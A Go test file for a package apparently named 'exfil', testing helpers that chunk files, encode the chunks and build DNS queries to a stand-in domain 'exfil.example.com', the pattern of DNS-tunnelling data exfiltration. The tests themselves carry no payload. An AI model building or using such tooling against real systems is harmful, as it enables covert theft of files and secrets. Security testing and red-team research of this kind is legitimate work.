package exfil

import (
	"strings"
	"testing"
)

func TestChunkResult(t *testing.T) {
	result := ChunkResult{
		Filename:  "secret.txt",
		ChunkNum:  1,
		TotalChnk: 5,
		Data:      []byte("chunk data"),
		Size:      10,
	}
	if result.Filename != "secret.txt" {
		t.Errorf("Filename = %q, want secret.txt", result.Filename)
	}
}

func TestEncodeChunk(t *testing.T) {
	chunk := &ChunkResult{
		Filename: "secret.txt",
		ChunkNum: 1,
		Data:     []byte("secret data"),
		Size:     11,
	}
	encoded := EncodeChunk(chunk, EncodeDNS)
	if encoded == "" {
		t.Errorf("EncodeChunk() returned empty string")
	}
}

func TestBuildDNSQuery(t *testing.T) {
	chunk := &ChunkResult{
		Filename: "secret.txt",
		ChunkNum: 1,
		Data:     []byte("test"),
		Size:     4,
	}
	query := BuildDNSQuery(chunk, "exfil.example.com")
	if query == "" {
		t.Errorf("BuildDNSQuery() returned empty string")
	}
	if !strings.Contains(query, "example.com") {
		t.Errorf("BuildDNSQuery() missing domain: %q", query)
	}
}

func TestChunkFile(t *testing.T) {
	chunks, err := ChunkFile("nonexistent.txt", 10)
	if err != nil {
		// Expected - file doesn't exist
		t.Logf("ChunkFile() expected error for nonexistent file: %v", err)
	} else if len(chunks) == 0 {
		t.Errorf("ChunkFile() returned empty chunks")
	}
}
